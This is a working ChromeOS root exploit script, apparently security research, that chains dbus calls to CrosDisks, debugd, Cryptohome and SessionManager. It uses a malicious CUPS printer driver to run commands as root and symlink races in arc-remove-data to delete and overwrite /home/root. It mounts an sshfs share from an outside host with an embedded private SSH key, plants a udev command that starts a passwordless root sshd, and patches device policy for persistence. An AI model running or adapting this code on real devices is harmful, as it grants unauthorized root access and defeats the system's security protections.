#define COMMENT #
SSH_KEY="LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0KYjNCbGJuTnphQzFyWlhrdGRqRUFBQUFBQkc1dmJtVUFBQUFFYm05dVpRQUFBQUFBQUFBQkFBQUJsd0FBQUFkemMyZ3RjbgpOaEFBQUFBd0VBQVFBQUFZRUF2WTJQOXBvZmFmWHpVVVNEV3lUUXYxdVlhN1hYZXZKOFgyTXhneVpkZXhGQkp5bWRRUEk0Cnk1U3VNb2k5ZWY0V2Q5QmJrUUZkZHUzMHZJSkpkT3ptOVpqeVB5VnVkLzRMM1FYd2RrZEZ6UlZORFhUeElOOEpXL2pxWXgKVnh4aEtvV1U3Q3c3MXROOUJUR25rQVdOY2R4Wm83am5MY3J3Y0xGZFBiSzMvYVlDQTVwRkhRMUFZNDdzaU05dFJsVFg0dApoQnk0WTVrY1VYdWxGQlg0WW4vajN1bWgzdm8wNkppZVB3dktJajZxcWMrTDdNRGVNSmNMajhwVUk5dk1kcCtSS0NYSHh0CmY0N0dmVE1LMjVUWVJpWUdUK1J3em1uSUtWd0lQRGZlT2UwdnZndEJueThzTUxiZ0RINzIvYUNmeVY4TTFMQWVFQVhqYWsKV2t1dG5KYU5rN2E5UWZqSk95NTEyQlA1dC9VWTYzeHBQYnRtUFhsOC9DTVg0K3JlSTI1VHZHNWxvZFczQWg5eWlPZFgwWQoxemdtRnBRQzdzRE5VMzh2OTdtanQzSmNDeEdpOTlzeFBuWG5jK1lpSlcrR2hIOWpMM2V0RHV2MEVlUml6Unc5eWgvQnJSCmpMamFoNWRrZ2g4b0FpbHVvODJlZEtNMlBZT09IeFV1eGNoaTRpN2RBQUFGaUh5NWhlVjh1WVhsQUFBQUIzTnphQzF5YzIKRUFBQUdCQUwyTmovYWFIMm4xODFGRWcxc2swTDlibUd1MTEzcnlmRjlqTVlNbVhYc1JRU2NwblVEeU9NdVVyaktJdlhuKwpGbmZRVzVFQlhYYnQ5THlDU1hUczV2V1k4ajhsYm5mK0M5MEY4SFpIUmMwVlRRMTA4U0RmQ1Z2NDZtTVZjY1lTcUZsT3dzCk85YlRmUVV4cDVBRmpYSGNXYU80NXkzSzhIQ3hYVDJ5dC8ybUFnT2FSUjBOUUdPTzdJalBiVVpVMStMWVFjdUdPWkhGRjcKcFJRVitHSi80OTdwb2Q3Nk5PaVluajhMeWlJK3FxblBpK3pBM2pDWEM0L0tWQ1BiekhhZmtTZ2x4OGJYK094bjB6Q3R1VQoyRVltQmsva2NNNXB5Q2xjQ0R3MzNqbnRMNzRMUVo4dkxEQzI0QXgrOXYyZ244bGZETlN3SGhBRjQycEZwTHJaeVdqWk8yCnZVSDR5VHN1ZGRnVCtiZjFHT3Q4YVQyN1pqMTVmUHdqRitQcTNpTnVVN3h1WmFIVnR3SWZjb2puVjlHTmM0SmhhVUF1N0EKelZOL0wvZTVvN2R5WEFzUm92ZmJNVDUxNTNQbUlpVnZob1IvWXk5M3JRN3I5QkhrWXMwY1Bjb2Z3YTBZeTQyb2VYWklJZgpLQUlwYnFQTm5uU2pOajJEamg4VkxzWElZdUl1M1FBQUFBTUJBQUVBQUFHQVFHb2Q5U0IwOG00NVRIR3E3Y3M2QVAxZ2M2CkhzNHdRS1RlUUlqRmY2Um5zYmwvSmxWUSs3U3p0d1l3M2l6ZFVSejQrSHZtUW5YZVlKV0JJeVlrQ3JUK1MwMWM2amxyVkgKVk1uUzZHN2FBcEp0aDlnb3BSSUdQVEgrZk1OcDBYUy9ydkc3OEFhc1dkNDZqM0YxTTd1T2kzc1pLQlJTZUV3OWNTSjRoWApUQ1FnNVJhRXpCV1h2djF2MWlJZk1WcGRydUhzb2Z3d0RpQmJLdDY0QjMwd2xBNTV5ZmZJV3NleXA2QkZTK1VScllwakk0Cmk3RVRFSklUeEw1dUQyMS9Nd1NRR2tYSHBJOHpQNUtlYm5HN1VKM3JkZGxLL2FmSDZCKzF2bE9XQ2Jkc0w2MzFoSDBTT1gKMTlLVW96bHorUE1XOExGV29PNTAzOFhDNHl0bXVIeXpDNnhralhkRGVqbWhoYzQrOE1YcjNMMU42UHRCNktOK212WEpjMApjOWVOL002V2VCbVA2SGlDdEdjTTRyZlFCVFZBSC95bmNMNklFdHp6dWdBTHBFeFJhaDM4V3dWQXE0cmFncU9OaXFtMkRKCjVNbVpZSzFXVlBhbjJaM2Qzd3hPdHNRTlhhWUJnUHVXcmwwK0lHY2w2eGZ5ZnJvUk03azlTWkdkd0dpaG51V3Z6bEFBQUEKd1FEai9pKzJPY1RTWnlXOGM0U2g3UVN5TGFackZsdTVIVmRnT1FZQ2h6OUJOVWxWMlpFR2JPUmFoNC9SUFJYY2xLWFlDSgplY0VhcjVyTXJNbHhpVTZrMEVYNFZzTm95dG8wSFh5eDg4WldaWnNXaERJeTdsV3JEenBoNFBvQXhSU1JGMi9BYkhHT2hsCkRZbmZSZHdoVTRzcWtUWVpZWFF1ZGM4RXhtMWlEcGhlbzFMS1Zad2tLNVZPbTlYWXpvTERzRHFacFBzMXBJOUxnZ0JENFQKSGpJdmx0YmR3d2J6NmpDc1NJcVR4dGhEYXFJbksrZnFqSDViL0wwdE1qWmtEWEFsc0FBQURCQU85Nzc0YVJ3RTF5dThKdwpFYmgvNGpFT1MxRmVta01yU0dSZWNTdDc4ZlVwWmdoN2drTmRKU1JqbEpPNVFxSklKTFJCMEpNRGJScHFZUW9NUERmcDNJCnRLYzAyTUg5ZGhWd0JUN3V5V0h1MDJlejRRbS9NZ0Y2NXdvQXRVeXhockdCdHZFeUZsRTNJUllDK1BEQW45Yksra2FHQUcKcUI2MTFYMW9xd1hMSmdvTFFycll0QmVkbHFjMm5BUUpzcGdHOVZqQWk5Si85SzUzRDZZQ0MyVUdibTdsTG9jN1A5VjJFVwpqcE0rQ1BHaGlDZkJrMk9URFlqcEZEZjh2ZCtudUxpd0FBQU1FQXlxQVpINmRwWW1TYUsrRXhodDFsQm9NWC9PRVRYdG4yCitmRXpPWjN4ZEdFR0J4ODdHZ0Q2d0RPUXAvZkMva3VMN3YvZTRiWUdqakoyMDI5UThsMVZBWEJIMDl2VVpSUGNCVENQbTMKNU9BRGtHcGF2N1ZWbk9iblpUdDZwRnpMMGxhY0ROV0k5UkFoN1E5VHFicUExbGNnWWE4UENoL01GUTdpdi9mRzAzYjNkcwpSTkJIZ0JaTWc3dHhPWllCNGZUcHZQSmRMamVjS3NkYy9kb0hQNkJQMlVmYWhOQXNYUS9Od3YxOHo1N2NXRlVYVlcxVGFMCkZzcy9yeDlHMWZ2QnczQUFBQUVXTm9jbTl1YjNOQWJHOWpZV3hvYjNOMEFRPT0KLS0tLS1FTkQgT1BFTlNTSCBQUklWQVRFIEtFWS0tLS0tCg=="
SSH_USER="rory"
SSH_HOST="172.16.2.72"

mount_sshfs() {
    COMMENT mount the above described ssh server to /media/fuse/exploit
    dbus-send --system --print-reply --dest=org.chromium.CrosDisks /org/chromium/CrosDisks org.chromium.CrosDisks.Mount string:"sshfs://${SSH_USER}@${SSH_HOST}:" string:"" array:string:"UserKnownHostsBase64=$(ssh-keyscan ${SSH_HOST} 2>/dev/null | base64 -w0),IdentityBase64=${SSH_KEY},rw,mountlabel=exploit" >/dev/null
    mkdir -p /media/fuse/exploit/android-data-old
}

get_salty_username() {
    COMMENT arc-remove-data works off the salted username. Generate them here
    dbus-send --system --print-reply --dest=org.chromium.Cryptohome /org/chromium/Cryptohome org.chromium.CryptohomeInterface.GetSanitizedUsername string:$1 | grep string | cut -d'"' -f2
}

dbus_pack_user() {
    COMMENT pack a username into a protobuf length,string for dbus
    user=$1
    packeduser=$(echo -n ${user} | xxd -i | tr -d ' \n')
    packedlen=$(printf '%x' ${#user})
    echo "0x${packedlen},${packeduser}"
}

add_printer() {
    COMMENT add the ppd from get_ppd as a printer
    dbus-send --print-reply --system --dest=org.chromium.debugd /org/chromium/debugd org.chromium.debugd.CupsAddManuallyConfiguredPrinter string:$(uuidgen) string:socket://127.0.0.1/exploit array:byte:$(get_ppd | xxd -i | tr -d '\n ') >/dev/null
}

printer_guid() {
    COMMENT get the guid of the printer we installed so we can remove it
    lpstat -t  | grep exploit | sed -r 's/device for ([^:]*):.*/\1/'
}

remove_printer() {
    COMMENT uninstall a printer, easier than fixing up a hanging one
    dbus-send --print-reply --system --dest=org.chromium.debugd /org/chromium/debugd org.chromium.debugd.CupsRemovePrinter string:$(printer_guid) >/dev/null
}

drop_pdf(){
    COMMENT just a standard minimal pdf from the internet for its mimetype for lp
    base64 -d <<-EOF | bunzip2 -dc > $1
#include "assets/pdf.pdf.b64"
EOF
}

get_ppd() {
    COMMENT ppd which runs /tmp/p > /tmp/l as cups:root via FoomaticRIPCommandLine
    COMMENT confirms complete by writing to fifo at /tmp/f
    base64 -d <<-EOF | bunzip2 -dc
#include "assets/ppd.ppd.b64"
EOF
}

trigger_cups() {
    COMMENT trigger FoomaticRIPCommandLine by adding a printer, 'printing' a pdf, and removing the printer
    COMMENT the fifo is just for timing
    add_printer
    mkfifo -m 777 /tmp/f
    touch /tmp/l
    chmod 777 /tmp/l
    triggerpdf=$(mktemp)
    drop_pdf ${triggerpdf}
    lp -d $(printer_guid) ${triggerpdf} >/dev/null
    rm ${triggerpdf}
    cat /tmp/f > /dev/null
    rm /tmp/f /tmp/l /tmp/p
    remove_printer
}

viacups() {
    COMMENT generic handler for each of the /tmp/p stagers
    $@
    trigger_cups
}

stage_backup() {
    COMMENT create a script to be run by cups to set up the /home/root/[hash]/android-data{,-old} directories
    COMMENT to backup the user's /home/root (hash -> .hash)
    COMMENT the last thing arc-remove-data does is unlink android-data, so if we base our android-data-old off this symlink we can stop arc-remove-stale-directories from working and wiping out our backup.
    salty_username=$1
    target=$2
    base="/home/root/${salty_username}"
    cat > /tmp/p <<-EOF
mkdir ${base}
mkdir /home/root/.${target}
mkdir /home/root/.${target}/backup

ln -s /home/root/${target} ${base}/android-data
ln -s android-data/../.${target}/backup/ ${base}/android-data-old
EOF
}

restore_backup() {
    COMMENT restore the above post-exploit, so we have a root shell
    runasroot "mv /home/root/.${CROS_USER_ID_HASH}/backup/**/android-data/* /home/root/${CROS_USER_ID_HASH} && rm -rf /home/root/.${CROS_USER_ID_HASH}"
}

brute_empty_hash() {
    COMMENT brute force a hash that, when lexographically sorted by rm -rf * will be deleted *after* the guest directory
    target_name=$(xxd -ps -l 8 /dev/urandom)
    salty_username=$(get_salty_username ${target_name})
    while [ "$(/bin/echo -e "${salty_username}\n${salty_guest}" | sort | tail -n1)" = "${salty_guest}" ]; do
        target_name=$(xxd -ps -l 8 /dev/urandom)
        salty_username=$(get_salty_username ${target_name})
    done
    echo "${target_name}"
}

stage_empty() {
    COMMENT stage the hash directory for the rm -rf android-data-old/ * to delete /home/root/ *
    salty_username=$1
    base="/home/root/${salty_username}"
    cat > /tmp/p <<-EOF
mkdir ${base}
mkdir ${base}/android-data
date > ${base}/android-data/deleteme
ln -s /home/root/ ${base}/android-data-old
EOF
}

wait_for_ard() {
    while ps aux | grep -q [r]emove-data; do
        sleep 0.5
    done
}

trigger_ard() {
    COMMENT arc-remove-data can be run by chronos, however in master it's in a mount namespace
    COMMENT so we can only move stuff around /home/root/
    username=${1}
    dbus-send --print-reply --system --dest=com.ubuntu.Upstart /com/ubuntu/Upstart/jobs/arc_2dremove_2ddata com.ubuntu.Upstart0_6.Job.Start array:string:"CHROMEOS_USER=${username}" boolean:false >/dev/null
    wait_for_ard
}

stage_overwrite() {
    COMMENT create a script to be run by cups to set up the /home/root/[hash]/android-data{,-old} directories
    COMMENT for the targeted copy
    COMMENT android-data/cache/EXPLOIT will be written to /run/udev/data/+pci:0000:00:00.0, so the command is in that format (E:REMOVE_CMD)
    salty_username=$1
    mount=/media/fuse/exploit
    base="/home/root/${salty_username}"
    cat > /tmp/p <<-EOF
mkdir ${base}
mkdir ${base}/android-data
mkdir ${base}/android-data/cache
echo "E:REMOVE_CMD=/bin/sh -c '/usr/sbin/sshd -f /tmp/sshd_config'" > ${base}/android-data/cache/EXPLOIT
mv ${base}/android-data-old ${base}/android-data-old.exploit.$(date +%s)
ln -s ${mount}/android-data-old ${base}/android-data-old
EOF
    stage_sshd
}

stage_sshd() {
    COMMENT set up a fake ssh server using the system sshd and enabling passwordless login for root with the provided key
    if [ ! -e /tmp/ssh_host_rsa_key ]; then
        ssh-keygen -f /tmp/ssh_host_rsa_key -N '' -t rsa >/dev/null
        mkdir /tmp/root/
        cp /tmp/ssh_host_rsa_key.pub /tmp/root/k
    fi
    cat > /tmp/sshd_config <<-EOF
AuthorizedKeysFile /tmp/%u/k
StrictModes no
HostKey /tmp/ssh_host_rsa_key
Port 1337
EOF
    rm -f /home/chronos/user/.ssh/known_hosts
}

trigger_copy() {
    COMMENT trigger the android-data/cache move
    COMMENT StartSession won't work without .pki/nssdb, so make it
    mkdir -p /home/user/${salty_guest}/.pki/nssdb
    (
    dbus-send --print-reply --system --dest=org.chromium.SessionManager /org/chromium/SessionManager org.chromium.SessionManagerInterface.StartSession string:'$guest' string:
    dbus-send --print-reply --system --dest=org.chromium.SessionManager /org/chromium/SessionManager org.chromium.SessionManagerInterface.StopArcInstance
    dbus-send --print-reply --system --dest=org.chromium.SessionManager /org/chromium/SessionManager org.chromium.SessionManagerInterface.StartArcMiniContainer array:byte:0x10,0x01
    dbus-send --print-reply --system --dest=org.chromium.SessionManager /org/chromium/SessionManager org.chromium.SessionManagerInterface.UpgradeArcContainer array:byte:0x0a,$(dbus_pack_user '$guest')
    ) > /dev/null 2>&1

}


stage_rescan() {
    COMMENT create the script for cups to remove and readd the pci device. This _may_ have unknown side effects
    COMMENT but none were seen during testing
    cat > /tmp/p <<-EOF
echo 1 > /sys/devices/pci0000\:00/0000\:00\:00.0/remove
echo 1 > /sys/devices/pci0000\:00/pci_bus/0000\:00/rescan
EOF
}

MountEx() {
    COMMENT do an ephemeral mount with new keys for the specified user.
    COMMENT first protobuf (AccountIdentifier): account_id = packed username

    COMMENT second protobuf (AuthorizationRequest):
    COMMENT key {
    COMMENT   data {
    COMMENT     type: KEY_TYPE_PASSWORD
    COMMENT     privileges {
    COMMENT       mount: true
    COMMENT       add: true
    COMMENT       remove: true
    COMMENT       update: true
    COMMENT       authorized_update: false
    COMMENT     }
    COMMENT   }
    COMMENT   secret: "test"
    COMMENT }

    COMMENT third protobuf (MountRequest):
    COMMENT require_ephemeral: true
    COMMENT create {
    COMMENT   keys {
    COMMENT     data {
    COMMENT       type: KEY_TYPE_PASSWORD
    COMMENT       label: "test"
    COMMENT     }
    COMMENT     secret: "test"
    COMMENT   }
    COMMENT }
    COMMENT to_migrate_from_ecryptfs: true
    COMMENT hidden_mount: true

    packeduser=$1
    dbus-send --system --print-reply --dest=org.chromium.Cryptohome /org/chromium/Cryptohome org.chromium.CryptohomeInterface.MountEx \
    array:byte:0x12,${packeduser} \
    array:byte:0xa,0x16,0xa,0xe,0x8,0x0,0x1a,0xa,0x8,0x1,0x10,0x1,0x18,0x1,0x20,0x1,0x28,0x0,0x12,0x4,0x74,0x65,0x73,0x74 \
    array:byte:0x8,0x1,0x12,0x12,0xa,0x10,0xa,0x8,0x8,0x0,0x12,0x4,0x74,0x65,0x73,0x74,0x12,0x4,0x74,0x65,0x73,0x74,0x20,0x1,0x30,0x1 >/dev/null
}

create_guest_dirs() {
    COMMENT if you mount guest cryptohome, then try (and fail) to mount another user, both end up unmounted
    COMMENT which means /home/user/[hash] and /home/root/[hash] are created
    COMMENT we delete the root one later but the user one remains

    tgtuser=$(xxd -ps -l 8 /dev/urandom)@exploit.com
    saltytgtuser=$(get_salty_username ${tgtuser})

    MountEx $(dbus_pack_user '$guest')

    touch /home/chronos/u-${saltytgtuser}
    MountEx $(dbus_pack_user "${tgtuser}")
    rm /home/chronos/u-${saltytgtuser}
}

runasroot() {
    ssh -p 1337 -i /tmp/ssh_host_rsa_key -o StrictHostKeyChecking=no root@127.0.0.1 "$@"
}

interactive() {
    runasroot
}

drop_patchpolicy(){
    COMMENT to add startup_flags to PolicyFetchResponse (/var/lib/whitelist/policy.X)
    base64 -d <<-EOF | bunzip2 -dc > $1
#include "policy/patchpolicy.b64"
EOF
}

latest_policy() {
    COMMENT get the latest in-use policy file
    echo "/var/lib/whitelist/policy.$(ls -1 /var/lib/whitelist/policy.* | cut -d. -f2 | sort -nr | head -n1)"
}

latest_backup_policy() {
    COMMENT get the latest backed up policy file
    echo "/var/lib/whitelist/policy.$(ls -1 /var/lib/whitelist/policy.*.bak | cut -d. -f2 | sort -nr | head -n1).bak"
}

patchpolicy() {
    CURRENT_SCRIPT="$1"
    ARGUMENT='--gpu-launcher=/bin/bash -c (/bin/sh\${IFS}<(/bin/cat\${IFS}/var/lib/whitelist/privesc.sh)\${IFS}x\${IFS}postboot&);exec\${IFS}\$0\${IFS}\$@'

    dropped_patchpolicy=$(mktemp)
    drop_patchpolicy "${dropped_patchpolicy}"
    chmod +x "${dropped_patchpolicy}"
    runasroot "mount -o remount,exec /tmp && ${dropped_patchpolicy} $(latest_policy) \"${ARGUMENT}\""
    rm "${dropped_patchpolicy}"

    runasroot "cp ${CURRENT_SCRIPT} /var/lib/whitelist/privesc.sh"
}

postboot() {
    COMMENT restore the backed up policy file and restart ui. Can be done via SessionManagerInterface, but this is easier.
    runasroot "/usr/bin/rename .bak '' /var/lib/whitelist/policy.*.bak;/sbin/initctl restart ui"
}

COMMENT wait for cryptohome etc to start up
if [ $2 = "postboot" ]; then
    COMMENT touch the file so that arc-boot-continue can succeed (enough)
    touch /run/chrome/arc_bridge.sock
    sleep 5
fi

echo "[+] Creating guest cryptohome dirs"
create_guest_dirs
sleep 1

target_name=$(xxd -ps -l 8 /dev/urandom)
salty_username=$(get_salty_username ${target_name})

guest='$guest'
salty_guest=$(get_salty_username ${guest})

COMMENT shouldn't be mounted prelogin so shouldn't need to do the backup
if [ $2 != "postboot" ]; then
    echo "[+] Backing up /home/root/${CROS_USER_ID_HASH}..."
    viacups stage_backup "${salty_username}" "${CROS_USER_ID_HASH}"
    trigger_ard "${target_name}"
fi

echo "[+] Bruteforcing new username to delete /home/root/[guest hash]"

target_name=$(brute_empty_hash)
salty_username=$(get_salty_username ${target_name})

echo "[+] Emptying /home/root/..."
viacups stage_empty "${salty_username}"
trigger_ard "${target_name}"

echo "[+] Mounting sshfs..."
mount_sshfs

echo "[+] Setting up android-data-old for user ${guest}..."
viacups stage_overwrite "${salty_guest}"

echo "[+] Triggering overwrite..."
trigger_copy

echo "[+] Triggered. Waiting for overwrite..."

while ! grep -q REMOVE_CMD "/run/udev/data/+pci:0000:00:00.0"; do
    sleep 0.5
done

echo "[+] Triggering REMOVE_CMD execution..."
viacups stage_rescan

if [ $2 != "postboot" ]; then
    echo "[+] Restoring backup..."
    restore_backup
fi

echo "[+] Cleaning up /home/root..."
runasroot "find /home/root -maxdepth 1 -user cups -exec rm -rf {} +"


echo "[+] 7/7 Handing off to post-script ($2)..."
eval "${2}" "${1}"
